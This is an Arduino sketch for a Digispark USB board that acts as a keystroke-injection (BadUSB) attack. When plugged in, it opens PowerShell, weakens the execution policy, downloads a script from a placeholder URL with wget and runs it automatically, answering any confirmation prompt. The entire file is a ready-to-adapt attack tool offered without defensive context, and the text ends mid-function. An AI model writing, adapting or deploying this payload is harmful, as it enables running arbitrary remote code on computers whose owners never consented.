#include "DigiKeyboard.h"
void setup() {
  delay(500);
  //send window key + d to minimize all open applications
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  delay(50);
  //send window key + r to open "run" window
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);     
  delay(500);
  
  DigiKeyboard.print("powershell");
  delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  //Downloading Script file to current user's download folder
  DigiKeyboard.print("set-executionpolicy -Scope CurrentUser remotesigned; wget \"http://yourpath/script.ps1\" -O \"$HOME\\Downloads\\d.ps1\";\"$HOME\\Downloads\\d.ps1\"");
  delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);
  //accept if any confirmation massages
  DigiKeyboard.print("y");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  
  //Set path to download folder
  DigiKeyboard.print("cd \"$HOME\\Downloads\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  //Execute downloaded file
  DigiKeyboard.print(".\\d.ps1");
  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
     

